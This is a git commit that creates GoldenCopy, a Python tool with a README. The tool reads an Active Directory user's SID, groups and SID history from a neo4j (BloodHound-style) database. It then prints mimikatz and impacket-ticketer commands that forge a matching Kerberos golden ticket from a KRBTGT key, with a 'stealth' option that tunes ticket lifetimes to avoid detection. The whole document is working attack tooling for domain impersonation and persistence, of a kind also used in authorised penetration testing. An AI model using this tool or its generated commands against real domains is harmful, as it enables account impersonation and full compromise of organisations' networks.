747a6130f14ae8bce919f9448a56935f541f4741
Dramelac <Dramelac@users.noreply.github.com>
2022-02-18 18:22:28 +0100

    Create project

---
+++ README.md
@@ -0,0 +1,65 @@
+# GoldenCopy
+
+Copy the properties and groups of a user from neo4j to create an
+identical golden ticket
+
+```
+usage: goldencopy.py [-h] [-v] [-b BOLT] [-u USERNAME] [-p PASSWORD]
+                     [-t {mimikatz,ticketer,all}] [-s] [-k KRBTGT] [-g GROUPS]
+                     [--sid SID] [-c CUSTOM]
+                     target_user
+
+GoldenCopy - Copy the properties and groups of a user from neo4j to create an
+identical golden ticket
+
+positional arguments:
+  target_user           Target user to copy (format: <username>[@<domain>])
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -v, --verbose         Enable verbose logging
+
+Neo4j connection configuration:
+  -b BOLT, --bolt BOLT  Neo4j bolt connexion (default: bolt://127.0.0.1:7687)
+  -u USERNAME, --username USERNAME
+                        Neo4j username (default : neo4j)
+  -p PASSWORD, --password PASSWORD
+                        Neo4j password (default : neo4j)
+
+Ticket configuration:
+  -t {mimikatz,ticketer,all}, --tools {mimikatz,ticketer,all}
+                        Ticket creation tools (default : all)
+  -s, --stealth         Stealth mode (default : disable)
+  -k KRBTGT, --krbtgt KRBTGT
+                        KRBTGT RC4,AES Key
+
+Advanced ticket configuration:
+  -g GROUPS, --groups GROUPS
+                        Manually add extra group ids (can be separated by
+                        commas)
+  --sid SID             Manually add extra sids (SID history) (can be
+                        separated by commas)
+  -c CUSTOM, --custom CUSTOM
+                        Custom options
+```
+
+Exemples:
+- Using default localhost neo4j (neo4j/neo4j) database:
+```
+goldencopy.py john@domain.local
+```
+- Custom neo4j DB:
+```
+goldencopy.py -b neo4j.server.local -u neo4juser -p neo4jpass john@domain.local
+```
+- Adding stealth mode:
+```
+goldencopy.py -b bolt://neo4j.server.local:7687 -u neo4juser -p neo4jpass -s john@domain.local
+```
+- Specific tools:
+```
+goldencopy.py -t mimikatz john@domain.local
+```
+```
+goldencopy.py -t ticketer john@domain.local
+```
---
+++ goldencopy.py
@@ -0,0 +1,236 @@
+#!/usr/bin/python3
+import argparse
+import logging
+import re
+
+from py2neo import Graph
+
+
+def args_parser():
+    parser = argparse.ArgumentParser(
+        description="GoldenCopy - Copy the properties and groups of a user from neo4j to create an identical golden ticket")
+    # Logging config
+    parser.add_argument('-v', '--verbose', action="count", default=0, dest="verbosity", help="Enable verbose logging")
+    # Neo4j connexion config
+    neo4j_group = parser.add_argument_group("Neo4j connection configuration")
+    neo4j_group.add_argument('-b', '--bolt', type=str, default="bolt://127.0.0.1:7687",
+                             help="Neo4j bolt connexion (default: bolt://127.0.0.1:7687)")
+    neo4j_group.add_argument('-u', '--username', type=str, default="neo4j", help="Neo4j username (default : neo4j)")
+    neo4j_group.add_argument('-p', '--password', type=str, default="neo4j", help="Neo4j password (default : neo4j)")
+    # Ticket generations options
+    ticket_group = parser.add_argument_group("Ticket configuration")
+    ticket_group.add_argument('-t', '--tools', type=str, choices=["mimikatz", "ticketer", "all"], default="all",
+                              help="Ticket creation tools (default : all)")
+    ticket_group.add_argument('-s', '--stealth', action="store_true", default=False,
+                              help="Stealth mode (default : disable)")
+    ticket_group.add_argument('-k', '--krbtgt', type=str, default="<KRBTGT Key>", help="KRBTGT RC4,AES Key")
+    # Tickets customisation
+    advanced_group = parser.add_argument_group("Advanced ticket configuration")
+    advanced_group.add_argument('-g', '--groups', type=str,
+                                help="Manually add extra group ids (can be separated by commas)")
+    advanced_group.add_argument('--sid', type=str,
+                                help="Manually add extra sids (SID history) (can be separated by commas)")
+    advanced_group.add_argument('-c', '--custom', type=str, default="", help="Custom options")
+    # Targeted user
+    parser.add_argument('target_user', type=str, help="Target user to copy (format: <username>[@<domain>])")
+    return parser.parse_args()
+
+
+def getNeo4jConnection():
+    bolt_target: str = args.bolt
+    # Check default protocol + host + port format
+    pattern_scan = re.match(r'(bolt://)?([\w.-]+)(:\d+)?', bolt_target)
+    if pattern_scan:
+        if pattern_scan.group(1) is None:
+            # Add default missing protocol
+            bolt_target = 'bolt://' + bolt_target
+        if pattern_scan.group(3) is None:
+            # Add default missing port
+            bolt_target += ':7687'
+    else:
+        logger.error(f"Error on neo4j target : {args.bolt}")
+        exit(0)
+    try:
+        g = Graph(bolt_target, auth=(args.username, args.password))
+        logger.debug("Neo4j logging successful")
+        return g
+    except Exception as e:
+        logger.critical(e)
+        exit(0)
+
+
+class User:
+    # Data class from neo4j returned User object to python object
+    def __init__(self, user):
+        self.fulluser = user[0]
+        self.username = self.fulluser.split('@')[0]
+        self.domain = user[1]
+        self.object_id = user[2]
+        self.user_id = self.object_id.split('-')[-1]
+        self.domain_id = '-'.join(self.object_id.split('-')[:-1])
+        self.sidhistory = user[3]
+
+
+class Group:
+    # Data class from neo4j returned Group object to python object
+    def __init__(self, group):
+        self.name = group[0]
+        self.domain = group[1]
+        self.object_id = group[2]
+        self.group_id = self.object_id.split('-')[-1]
+        self.domain_id = '-'.join(self.object_id.split('-')[:-1])
+
+
+def findUser(g):
+    req = g.run(f"""MATCH (u:User) 
+    WHERE u.name =~ '(?i).*{args.target_user}.*'
+    RETURN u.name, u.domain, u.objectid, u.sidhistory
+    ORDER BY u.enabled DESC,u.name""").to_table()
+    user_count = len(req)
+    if user_count == 0:
+        logger.critical("No user found !")
+        exit(0)
+    elif user_count > 1:
+        logger.warning("Multiple user found, please choose one")
+        # TODO multiple users found
+        logger.warning(req)
+        logger.warning(f"Using {req[0][0]}")
+        return User(req[0])
+    else:
+        return User(req[0])
+
+
+def findGroupFromUser(g, user):
+    req = g.run(f"""MATCH (m:User 
+    {{objectid: "{user.object_id}"}}), (n:Group), p=(m)-[:MemberOf]->(n) 
+    RETURN n.name, n.domain, n.objectid""")
+    data = req.to_table()
+    group_count = len(data)
+    logger.info(f"{group_count} group found for {user.fulluser} !")
+    groups = [Group(x) for x in data]
+    return groups
+
+
+def keyType():
+    key_len = len(args.krbtgt)
+    if key_len == 16:
+        return "des"
+    elif key_len == 32 or key_len == 65:
+        return "rc4"  # If 32 Could also be AES 128
+    elif key_len == 64:
+        return "aes"
+    return "default"
+
+
+def groupList(groups):
+    total_groups = set(i.group_id for i in groups)
+    if args.groups is not None:
+        total_groups.update(args.groups.split(','))
+    return ','.join(total_groups)
+
+
+def extraSidList(user: User):
+    total_sid = set(user.sidhistory)
+    if args.sid is not None:
+        total_sid.update(args.sid.split(','))
+    return ','.join(total_sid)
+
+
+def goldenMimikatz(user, groups):
+    logger.info("Creating commands for mimikatz")
+
+    def getKey():
+        type = keyType()
+        if type == "rc4":
+            return f"/rc4:{args.krbtgt}"
+        elif type == "aes":
+            return f"/aes256:{args.krbtgt}"
+        else:
+            return f"/krbtgt:{args.krbtgt}"
+
+    def getExtraSid(user):
+        sids = extraSidList(user)
+        return f"/sids {sids} " if sids != "" else ""
+
+    cmd = f"mimikatz kerberos::golden " \
+          f"/user:{user.username} " \
+          f"/domain:{user.domain} " \
+          f"/id:{user.user_id} " \
+          f"/sid:{user.domain_id} " \
+          f"{getKey()} " \
+          f"/groups:{groupList(groups)} " \
+          f"{getExtraSid(user)}" \
+          f"{args.custom}"
+    if args.stealth:
+        cmd += "/startoffset:0 " \
+               "/endin:600 " \
+               "/renewmax:10080 "
+    cmd += "/ptt"
+    print(cmd)
+    print()
+    return cmd
+
+
+def goldenTicketer(user, groups):
+    logger.info("Creating commands for ticketer")
+
+    def getKey():
+        type = keyType()
+        if type == "rc4":
+            return f"-nthash {args.krbtgt}"
+        elif type == "des":
+            raise NotImplementedError
+        else:
+            return f"-aesKey {args.krbtgt}"
+
+    def getExtraSid(user):
+        sids = extraSidList(user)
+        return f"-extra-sid {sids} " if sids != "" else ""
+
+    cmd = f"impacket-ticketer {getKey()} " \
+          f"-domain {user.domain} " \
+          f"-domain-sid {user.domain_id} " \
+          f"-groups {groupList(groups)} " \
+          f"-user-id {user.user_id} " \
+          f"{getExtraSid(user)}" \
+          f"{args.custom}"
+    if args.stealth:
+        logger.warning("WARNING: default ticketer duration use days and not hours, you should fix your tools ! "
+                       "(stealth require 10 hours tickets)")
+        cmd += f"-duration 10 "
+    cmd += user.username
+    cmd += f"\nexport KRB5CCNAME=$(pwd)/{user.username}.ccache"
+    print(cmd)
+    print()
+    return cmd
+
+
+def forgeTicket(user, groups):
+    tools = {"mimikatz": goldenMimikatz, "ticketer": goldenTicketer}
+    if args.custom != "":
+        args.custom += " "
+    if args.tools == "all":
+        for forgeFunc in tools.values():
+            forgeFunc(user, groups)
+    else:
+        tools.get(args.tools)(user, groups)
+
+
+def main():
+    g = getNeo4jConnection()
+    user = findUser(g)
+    groups = findGroupFromUser(g, user)
+    forgeTicket(user, groups)
+
+
+if __name__ == '__main__':
+    args = args_parser()
+    logging.basicConfig(format="%(message)s")
+    logger = logging.getLogger()
+    if args.verbosity == 0:
+        logger.setLevel(logging.WARNING)
+    elif args.verbosity == 1:
+        logger.setLevel(logging.INFO)
+    else:
+        logger.setLevel(logging.DEBUG)
+    main()
